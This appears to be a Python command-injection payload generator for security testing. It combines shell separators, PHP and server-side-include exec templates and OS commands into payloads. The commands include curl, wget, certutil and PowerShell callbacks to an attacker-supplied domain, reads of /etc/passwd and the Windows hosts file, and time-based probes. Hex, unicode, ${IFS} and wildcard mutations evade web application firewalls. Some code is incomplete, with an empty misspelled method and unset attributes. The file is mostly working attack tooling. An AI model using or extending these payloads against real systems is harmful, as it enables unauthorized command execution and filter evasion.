import base64
import urllib.parse

class OSCommandInjectionPayloadGenerator():
    def __init__(self):
        self.basic_payload_templates = [
            '$;COMMAND',
            '$(`COMMAND`)',
            '%0ACOMMAND',
            '%0a COMMAND %0a',
            '%0ACOMMAND%0A',
            'a);COMMAND',
            'a);COMMAND;',
            'a);COMMAND|',
            'a)|COMMAND',
            'a)|COMMAND;',
            'a;COMMAND',
            'a;COMMAND;',
            'a;COMMAND|',
            'a|COMMAND',
            '& COMMAND',
            '& COMMAND &',
            '&&COMMAND&&',
            '; COMMAND',
            ';|COMMAND|',
            ';COMMAND',
            ';COMMAND;',
            ';COMMAND|',
            '`COMMAND`',
            '| COMMAND',
            '||COMMAND;',
            '||COMMAND|',
            '|COMMAND',
            '|COMMAND;',
            '|COMMAND|',
            'COMMAND',
            ';COMMAND\\n',
            '|COMMAND\\n',
            '<!--#exec cmd="COMMAND"-->',
            '<!--#exec cmd="COMMAND;-->',
            '{{ get_user_file("COMMAND") }}',
            '\\nCOMMAND;',
            '\\nCOMMAND|',
            '\\nCOMMAND;',
            '\\nCOMMAND\\n',
            '<!--#passthru cmd="COMMAND"-->',
            '<?php exec("COMMAND");?>',
            '<?php passthru("COMMAND");?>',
            '<?php system("COMMAND");?>',
            '<!--#system cmd="COMMAND"-->',
            ';system(\'COMMAND\')',
            'system(\'COMMAND\');',
            '`COMMAND`',
            '$(COMMAND)'
        ]

        self.control_characters = ['/', '&&', '\\n', '#', '!', '`', '%0a', '${IFS}', "'", '|', '$', '||', ';', '&', '\\t', '"', ' ']

        self.commands = [
            ("windows","timeout","timeout /T TIMEOUT"),
            ("windows","timeout","ping -n TIMEOUT 127.0.0.1"),
            ("windows", "reflection", "echo UNIQUE"),
            ("windows", "reflection", "type C:\\Windows\\System32\\drivers\\etc\\hosts"),
            ("windows", "oast", "powershell Invoke-WebRequest -Uri http://DOMAIN/?d=UNIQUE"),
            ("windows", "oast", "wget http://DOMAIN/UNIQUE"),
            ("windows", "osat", "curl http://DOMAIN/UNIQUE"),
            ("windows", "oast", "certutil -urlcache -split -f http://DOMAIN/UNIQUE"),
            ("windows", "oast", "nslookup DOMAIN"),
            ("linux","timeout","sleep TIMEOUT"),
            ("linux","timeout","ping -c TIMEOUT 127.0.0.1"),
            ("linux","reflection","echo UNIQUE"),
            ("linux","reflection","echo $(( 1337 * 1337 ))"),
            ("linux","reflection","yes UNIQUE | head -n 3 | tr -d '\\n'"),
            ("linux", "reflection", "cat /etc/passwd"),
            ("linux", "reflection", "cat /proc/version"),
            ("linux","oast","curl http://DOMAIN/UNIQUE"),
            ("linux","oast","wget http://DOMAIN/UNIQUE"),
            ("linux","oast","nslookup DOMAIN"),

        ]

        self.oast_payloads = False
        self.time_payloads = False
        self.reflection_payloads = False
        self.platforms = ["linux", "windows"]
        
        self.url_encode_payload = False
        self.wildcard_bypass = False
        self.substitute = False
        self.waf = False

    def generate_paylaods(self):
        pass

    def generate_oast_payloads(self):
        
        # obtain only the necessary payloads
        oast_commands = list(set([self.change_templates(c[2]) for c in self.commands if c[0] in self.platforms and c[1] == "oast"]))
        
        payloads = [f"{prefix}{c}{sufix}" for c in oast_commands for sufix in self.control_characters for prefix in self.control_characters]

        mutated = self.mutate(payloads)
        if mutated:
            payloads.extend(mutated)

        if self.url_encode_payload:
            encoded = self.url_encode(payloads)
            payloads.extend(encoded)


        return list(set(payloads))

    def generate_time_payloads(self):
         # obtain only the necessary payloads
        oast_commands = list(set([self.change_templates(c[2]) for c in self.commands if c[0] in self.platforms and c[1] == "timeout"]))
        
        payloads = [f"{prefix}{c}{sufix}" for c in oast_commands for sufix in self.control_characters for prefix in self.control_characters]

        mutated = self.mutate(payloads)
        if mutated:
            payloads.extend(mutated)

        if self.url_encode_payload:
            encoded = self.url_encode(payloads)
            payloads.extend(encoded)


        return list(set(payloads))


    def generate_reflection_payloads(self):
         # obtain only the necessary payloads
        oast_commands = list(set([self.change_templates(c[2]) for c in self.commands if c[0] in self.platforms and c[1] == "reflection"]))
        
        payloads = [f"{prefix}{c}{sufix}" for c in oast_commands for sufix in self.control_characters for prefix in self.control_characters]

        mutated = self.mutate(payloads)
        if mutated:
            payloads.extend(mutated)

        if self.url_encode_payload:
            encoded = self.url_encode(payloads)
            payloads.extend(encoded)


        return list(set(payloads))

    
    def change_templates(self, command):
        return command.replace("UNIQUE", self.unique_string).replace("TIMEOUT", str(self.sleep_timeout)).replace("DOMAIN", self.domain)

    def apply_waf_bypass(self, payload):
        result = []
        # Hex Encoded payloads
        hex_encoded = ''.join(f'\\x{ord(c):02x}' if c.isalnum() else c for c in payload)
        result.append(hex_encoded)

        # Unicode Encoding
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' if c.isalnum() else c for c in payload)
        result.append(unicode_encoded)

        # Whitespace Obfuscation
        whitespace_bypass = payload.replace(" ", "${IFS}")
        result.append(whitespace_bypass)


        return result
    
    def mutate(self, payloads):
        result = []

        for payload in payloads:
            if self.wildcard_bypass:
                if "/etc/passwd" in payload or "/proc/version" in payload:
                    wc = payload.replace("e","?").replace("p","?").replace("s","?").replace("o","?")
                    result.append(wc)
            
            if self.waf:
                hex_encoded = ''.join(f'\\x{ord(c):02x}' if c.isalnum() else c for c in payload)
                result.append(hex_encoded)

                # Unicode Encoding
                unicode_encoded = ''.join(f'\\u{ord(c):04x}' if c.isalnum() else c for c in payload)
                result.append(unicode_encoded)

                # Whitespace Obfuscation
                whitespace_bypass = payload.replace(" ", "${IFS}")
                result.append(whitespace_bypass)
            

        return result

    def url_encode(self, payloads):
        return [urllib.parse.quote(payload) for payload in payloads]

# /etc/passwd /proc/version